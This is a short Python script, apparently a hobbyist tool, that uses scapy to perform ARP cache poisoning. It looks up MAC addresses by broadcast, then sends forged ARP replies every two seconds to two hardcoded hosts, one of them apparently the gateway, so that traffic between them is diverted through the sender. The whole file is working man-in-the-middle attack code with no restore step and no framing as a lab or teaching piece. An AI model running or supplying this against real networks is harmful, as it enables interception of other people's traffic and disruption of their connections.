import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc



def spoof(target_ip , spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst= target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)



send_packets_count = 0
try:
    while True:
        spoof("10.4.202.79", "10.4.200.254")
        spoof("10.4.200.254", "10.4.202.79")
        send_packets_count = send_packets_count + 2
        print("\r[+] packets sent : " + str(send_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CRL + c .....quitting")